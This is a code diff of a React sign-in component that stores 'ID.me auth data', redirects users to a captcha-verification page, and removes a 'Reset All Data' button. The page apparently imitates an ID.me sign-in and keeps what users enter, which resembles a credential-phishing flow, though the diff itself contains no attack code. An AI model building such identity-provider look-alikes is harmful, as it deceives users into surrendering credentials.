@@ -156,9 +156,9 @@ export default function SignIn() {
       });
     
       // Redirect to captcha verification
-      setTimeout(() => {
-        router.push("/auth/captcha-verification");
-      }, 1000);
+    setTimeout(() => {
+      router.push("/auth/captcha-verification");
+    }, 1000);
     } catch (error) {
       console.error('Failed to save ID.me auth data:', error);
       setError("Failed to save your data. Please try again.");
@@ -167,12 +167,7 @@ export default function SignIn() {
     }
   };
 
-  const handleManualReset = async () => {
-    await resetUserData();
-    setIsReset(true);
-    // Hide the reset confirmation after 3 seconds
-    setTimeout(() => setIsReset(false), 3000);
-  };
+  
 
   return (
     <div className="flex min-h-[calc(100vh-4rem)] flex-col items-center justify-center bg-[#0053a0] px-4 py-8">
@@ -286,19 +281,7 @@ export default function SignIn() {
             </p>
           </div>
 
-          {/* Reset Data Button */}
-          <div className="flex justify-center border-t border-gray-200 pt-4">
-            <button
-              type="button"
-              onClick={handleManualReset}
-              className="text-xs text-gray-500 hover:text-[#0053a0] flex items-center"
-            >
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-              </svg>
-              Reset All Data
-            </button>
-          </div>
+          
 
           {/* Verification Partner Logos */}
           <div className="mt-6">
